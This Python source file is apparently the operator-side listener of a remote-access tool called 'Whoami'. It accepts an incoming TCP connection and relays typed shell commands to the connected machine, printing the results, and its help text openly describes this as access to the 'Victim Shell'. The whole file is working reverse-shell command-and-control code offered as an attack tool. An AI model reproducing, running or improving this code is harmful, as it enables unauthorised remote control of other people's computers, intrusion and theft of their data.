import socket
import os
import platform

RED = '\033[91m'
GREEN = '\33[92m'
END = '\033[0m'

TRUE = f"{GREEN}[+]{END}"
FALSE = f"{RED}[!]{END}"

def machine_os():
    try:
        machine_os = platform.system()
        return machine_os

    except Exception as machine_os_error:
        return(f"\n{FALSE} Failed To Get The Machine Os {machine_os_error}.")

def clear():
    if machine_os() == "Windows":
        clear = os.system("cls")
        
    else:
        clear = os.system("clear")


def whoami_listen(listen_host, listen_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((listen_host, listen_port))
        s.listen(1)
        print(f"\n{TRUE} Whoami Started Listening On Host {listen_host} And Port {listen_port}, You Can Stop Listening By Pressing CTRL-C.")
        conn, address = s.accept()
        print(f"\n{TRUE} Whoami New Session Opened {address}")
        print(f"\n{TRUE} Type 'exit' To Exit If You Use CTRL-C Might Be Some Problems.")

        while True:
            command = input(f"\nWhoami>{GREEN}{address[0]}{END}: ")
            if len(command) > 0:

                if command == "shell":
                    conn.send(command.encode())
                    print(f"\n{TRUE} Shell Mode Activated.")
                    print(f"\n{TRUE} Type 'back' To Exit Shell Mode.")
                    while True:
                        command = input(f"\nWhoami>{GREEN}{address[0]}>shell{END}: ") 
                        
                        if command == "clear":
                            clear()

                        elif command == "back":
                            conn.send(command.encode())
                            break
                        
                        else:
                            if len(str.encode(command)) > 0:
                                conn.send(str.encode(command))
                                client_response = str(conn.recv(102400),"utf-8")
                                print(client_response, "\n",end="")
                
                elif command == "help":
                    print(f"\n{TRUE} shell   : You Will Have Access To Victim Shell\n{TRUE} clear   : Clear The Screen\n{TRUE} exit    : Exit Listening Mode")

                elif command == "clear":
                    clear()
                
                elif command == "exit":
                    conn.send(command.encode())
                    print(f"\n{FALSE} Whoami Listening Stopped.")
                    break

                else:
                    print(f"\n{FALSE} Wrong Command.")
            
            else:
                pass

    except KeyboardInterrupt:
        print(f"\n{FALSE} Whoami Listening Stopped.")

    except socket.error:
        print(socket.error)
        print(f"\n{FALSE} Failed To Start Listening Try To Close Any Active Listeners Or Check Your Host And Your Port.")

    except Exception as listen_error:
        print (f"\n{FALSE} Please Check Your Host And Your Port: \n{FALSE} Host : {listen_host}\n{FALSE} Port : {listen_port} {listen_error}.")